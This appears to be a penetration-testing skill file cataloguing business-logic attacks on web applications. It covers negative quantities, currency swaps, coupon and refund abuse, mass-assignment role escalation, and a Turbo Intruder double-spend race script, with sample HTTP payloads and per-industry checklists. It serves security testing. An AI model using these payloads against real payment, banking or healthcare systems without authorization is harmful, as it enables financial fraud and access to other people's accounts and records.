---
name: business-logic-taxonomy
pattern: Business Logic Testing Taxonomy
description: "Exhaustive taxonomy of business logic attack payloads: price manipulation, workflow bypass, race conditions, privilege escalation, data validation gaps, and per-industry patterns (e-commerce, SaaS, banking, healthcare, travel)"
tech: [generic, ecommerce, saas, fintech]
triggers: ["/test-logic", "logic taxonomy", "price payload", "race condition payload", "currency confusion", "negative quantity", "coupon stacking", "mass assignment"]
related_patterns: ["business-logic-testing", "race-condition-money", "access-control-testing", "hidden-param-discovery", "api-testing-methodology"]
sources: ["portswigger-academy", "intigriti-blog"]
severity: Medium-Critical
---

# Business Logic Testing Taxonomy

## Crown Jewel Targets

- **E-commerce with client-side pricing** -- any app that sends `price` or `amount` in client requests is vulnerable to price manipulation (zero price, negative quantity, currency swap)
- **Fintech/banking with balance operations** -- concurrent transfer/withdrawal = double-spend. Turbo Intruder with gate-based parallel requests is the standard PoC tool
- **SaaS with feature gating via API** -- UI hides premium features but API allows direct access. `GET /api/premium-feature` with free-tier token = feature gate bypass
- **Multi-step checkout/approval workflows** -- skip step 2 (payment) by jumping directly to step 4 (confirmation). Replay step 2 for duplicate processing
- **Coupon/referral engines** -- race condition on single-use coupon, stacking exclusive coupons, self-referral loops for bonus extraction
- **Travel/booking with price locks** -- complete old-price booking after price increase, seat selection without payment, loyalty points negative redemption
- **Healthcare/insurance with claim processing** -- duplicate claim submission, amount manipulation, cross-patient record access via ID swap

## Attack Surface Signals

- **URL patterns**: `/api/checkout`, `/api/cart/update`, `/api/transfer`, `/api/redeem`, `/api/register`, `/api/profile`, `/api/subscription/upgrade`
- **Parameters to fuzz**: `quantity` (0, -1, MAX_INT, float), `price` (0, negative, remove), `currency` (JPY/KRW for 100x cheaper), `coupon_code` (duplicate, expired), `role` (admin), `plan` (enterprise)
- **JS indicators**: `validateQuantity`, `checkDiscount`, `isEligible`, `trialEnd`, `featureGate`, `maxRetries`
- **Race signals**: any balance-changing operation, one-time-use tokens, state transitions with financial impact

## Price Manipulation
- Negative quantity: `quantity=-1` → refund instead of charge
- Zero price: `price=0` or remove price param
- Float precision: `amount=0.001` (rounds to 0)
- Currency confusion: change currency code without adjusting amount (USD→JPY)
- Coupon stacking: apply multiple coupons exceeding item value
- Race condition: apply coupon → change cart → coupon still applies
- Tax manipulation: change shipping address to tax-free zone after pricing

## Workflow Bypass
- Skip steps: go from step 1 → step 4 directly
- Replay: replay step 2 multiple times (duplicate processing)
- Out-of-order: complete step 3 before step 2
- Parameter tampering between steps: modify session/hidden fields
- Direct API call: bypass frontend wizard, hit backend API directly

## Race Conditions in Financial Operations
- Double-spend: simultaneous purchase with same balance
- Concurrent booking: book same slot from 2 sessions
- Parallel transfers: transfer $100 twice from $100 balance
- Coupon race: use same one-time coupon in parallel requests
- Test: Burp Turbo Intruder, `Promise.all()` in Playwright

## Privilege Escalation via Function Abuse
- Invitation flow: invite self to higher role
- API param injection: add `role=admin` to profile update
- Feature flag manipulation: enable premium features via hidden params
- Org boundary bypass: access resources across tenant boundaries

## Data Validation Gaps
- Boundary values: INT_MAX, empty string, very long strings
- Type confusion: string where int expected, array where string
- Unicode normalization: `café` vs `cafe\u0301`
- Null/undefined: JSON `null` vs missing field vs empty string
- Scientific notation: `1e10` as amount

## E-Commerce Specific
- Cart manipulation after payment initiation
- Gift card balance transfer to cash
- Refund to different payment method
- Free shipping threshold manipulation
- Wishlist/cart sharing → price change race

## SaaS Specific
- Trial extension (re-register, modify trial dates)
- Seat limit bypass (invite → remove → invite pattern)
- Feature gate bypass via API (UI hides, API allows)
- Webhook replay (re-trigger events)
- API key scope escalation

## Banking/Financial
- Transaction signing bypass
- Beneficiary manipulation (change after verification)
- Statement period manipulation
- Cross-account transfer validation
- Negative transfer (reverse money direction)

## Intigriti-Sourced Patterns
- Currency confusion attack (USD→JPY price manipulation without conversion)
- Inconsistent validation paths (signup validates, preferences update doesn't)
- Order initiation ID manipulation (access other customers' checkout data)
- Duplicate refund exploitation (race condition on refund endpoint)
- Multi-step workflow state manipulation (modify state between verification steps)

## Detection Methodology

### 1. Map Business Flows First
- Draw state machine: registration → verification → active → payment → fulfillment
- Identify every state transition + who/what triggers it
- Look for **missing transition guards** (can you go from state A → C skipping B?)

### 2. Parameter Enumeration per Flow
```
For each endpoint in a flow:
  1. Capture normal request (Burp)
  2. List ALL parameters (visible + hidden)
  3. Test: remove param, zero, negative, max_int, type confusion
  4. Test: add unexpected params (role, admin, price, discount)
  5. Compare: does backend validate what frontend enforces?
```

### 3. Client-Side vs Server-Side Validation Gap
```javascript
// Frontend: enforces min=1, max=99
<input type="number" min="1" max="99" name="quantity">

// Test: Burp intercept → quantity=-1, quantity=0, quantity=999999
// Test: Remove client validation entirely via DevTools
// If backend accepts → business logic vuln
```

## Exploitation Patterns (Detailed)

### Currency Confusion — Full Attack
```http
POST /api/checkout HTTP/1.1
Content-Type: application/json

{"item_id": "premium_plan", "amount": 99.99, "currency": "JPY"}
```
- $99.99 USD → sent as ¥99.99 JPY (~$0.67 USD)
- Works when: payment gateway receives currency from client, no server-side normalization
- **Variations**: change currency mid-checkout, different currency in cart vs payment

### Coupon/Discount Stacking
```
1. Add item ($100) to cart
2. Apply coupon SAVE20 (-$20) → $80
3. Apply coupon WELCOME10 (-$10) → $70
4. Test: apply SAVE20 again → $50? (no dedup)
5. Test: negative coupon value? coupon on already-discounted item?
6. Test: race condition — apply same coupon from 2 sessions simultaneously
```

### Refund Abuse
```
1. Purchase item → get order_id
2. Request refund → approved → money returned
3. Request refund AGAIN with same order_id
4. Race condition variant: 2 simultaneous refund requests
5. Check: refund to different payment method than original
6. Check: partial refund sum > total (multiple partial refunds)
```

### Negative Quantity / Amount
```http
POST /api/cart/update HTTP/1.1
{"item_id": "SKU123", "quantity": -5, "price": 29.99}
# Result: store "owes" customer $149.95

POST /api/transfer HTTP/1.1  
{"from": "victim_account", "to": "attacker_account", "amount": -500}
# Result: reverse transfer direction
```

### Race Condition in Payments (Turbo Intruder)
```python
# Turbo Intruder script for double-spend
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=1,
                          pipeline=False)
    for i in range(20):
        engine.queue(target.req, gate='race')
    engine.openGate('race')  # All fire simultaneously
```

### Privilege Escalation via Function Abuse
```http
# Normal user profile update
PUT /api/profile HTTP/1.1
{"name": "John", "email": "john@example.com"}

# Test: add role parameter
PUT /api/profile HTTP/1.1
{"name": "John", "email": "john@example.com", "role": "admin"}

# Test: mass assignment — add any field from admin model
{"name": "John", "is_admin": true, "permissions": ["*"]}
```

## Per-Industry Attack Patterns

### Healthcare
- Appointment slot manipulation (book past dates, double-book)
- Prescription refill bypass (exceed refill count)
- Patient record boundary (access other patient via ID swap)
- Insurance claim amount manipulation

### Insurance / Finance
- Quote manipulation (change risk factors after quote)
- Claim duplicate submission
- Premium calculation bypass (misrepresent data)
- Cross-account transfer validation gaps
- Transaction signing replay

### Travel / Booking
- Price lock bypass (complete old-price booking after price increase)
- Seat selection without payment
- Loyalty points manipulation (negative redemption)
- Cancel-rebook arbitrage (cancel expensive, rebook at promo)

### Education / SaaS
- Trial extension (re-register with alias email)
- Seat limit bypass: invite user → remove → invite new (count doesn't decrement)
- Feature gate: UI hides premium features but API allows access
- Exam time extension (modify timer client-side, server doesn't validate)

## Payloads Quick Reference

| Attack | Payload | Expected Result |
|--------|---------|----------------|
| Zero price | `"price": 0` or remove price field | Free purchase |
| Negative qty | `"quantity": -1` | Credit/refund |
| Integer overflow | `"amount": 2147483647` | Wrap to negative |
| Float precision | `"amount": 0.001` | Rounds to 0 |
| Currency swap | `"currency": "JPY"` | 100x cheaper |
| Type confusion | `"price": "0"` (string) | Parser coercion |
| Scientific | `"amount": "1e-10"` | Near-zero |
| Array qty | `"quantity": [1]` | Bypass validation |
| Null | `"discount": null` | Skip discount check |

## Tools

| Tool | Usage |
|------|-------|
| Burp Repeater | Manual parameter tampering per request |
| Burp Intruder | Brute-force parameter values (IDs, amounts) |
| Turbo Intruder | Race conditions (gate-based parallel requests) |
| Autorize (Burp) | Auto-test access control on every request |
| Playwright | Multi-step workflow automation + state manipulation |
| `Promise.all()` | Browser-based race condition via JS |

## Checklist (Per Target)

- [ ] Map all financial flows (payment, refund, transfer, credit)
- [ ] Test quantity: 0, -1, MAX_INT, float, string, array, null
- [ ] Test price: remove, zero, negative, currency swap
- [ ] Test coupon: stack, reuse, race, negative value
- [ ] Test workflow: skip steps, replay steps, out-of-order
- [ ] Test access: other user's IDs in every param
- [ ] Test race: parallel requests on balance-changing operations
- [ ] Test role: add admin/role/permission params to updates
- [ ] Test state: modify hidden fields between multi-step forms
- [ ] Verify: server-side validation matches client-side constraints

## Operator Notes (Battle-Tested)

1. **Currency confusion is the most underreported logic bug** -- change `"currency": "USD"` to `"currency": "JPY"` in the checkout API. If the amount stays the same numeric value but the currency changes, $99.99 becomes ~$0.67. Works when payment gateway receives currency from client without server-side normalization.
2. **Turbo Intruder for race conditions is the gold standard** -- queue 20 identical requests, fire via `engine.openGate('race')`. Even one success out of 20 = confirmed double-spend/duplicate-coupon. Document the exact timing and successful response in your report.
3. **Type confusion payloads are often overlooked** -- `"price": "0"` (string instead of int), `"quantity": [1]` (array instead of int), `"discount": null`, `"amount": "1e-10"` (scientific notation). Different languages/parsers handle these differently. Python/Ruby/PHP are especially susceptible to type coercion.
4. **Map the state machine BEFORE attacking** -- draw: registration -> verification -> active -> payment -> fulfillment. Each arrow is a testable transition. Can you skip arrows? Reverse arrows? Take two arrows simultaneously? Missing transition guards = logic bug.
5. **Refund abuse check: does `order_id` get invalidated after refund?** -- request refund, then request SAME refund again with same `order_id`. If second refund succeeds = double refund. Also test: partial refunds summing > total, refund to different payment method than original.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Strategic business logic testing methodology | `business-logic-testing` |
| Race condition exploitation techniques | `race-condition-money` |
| IDOR/BAC in business flows | `access-control-testing` |
| Hidden params for mass assignment | `hidden-param-discovery` |
| API endpoint testing for logic flaws | `api-testing-methodology` |
